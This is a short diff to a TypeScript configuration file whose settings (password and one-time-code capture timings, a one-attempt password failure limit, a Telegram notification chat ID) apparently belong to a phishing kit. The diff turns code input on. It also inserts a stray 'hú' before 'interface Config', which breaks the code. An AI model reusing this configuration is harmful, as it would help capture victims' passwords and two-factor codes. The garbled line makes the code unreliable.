@@ -1,4 +1,4 @@
-interface Config {
+hú interface Config {
   settings: {
     code_loading_time: number;
     max_failed_code_attempts: number;
@@ -23,7 +23,7 @@ const defaultConfig: Config = {
     max_failed_password_attempts: 1,
     page_loading_time: 5000,
     password_loading_time: 12000,
-    code_input_enabled: false,
+    code_input_enabled: true,
   },
   telegram: {
     notification_chatid: '',
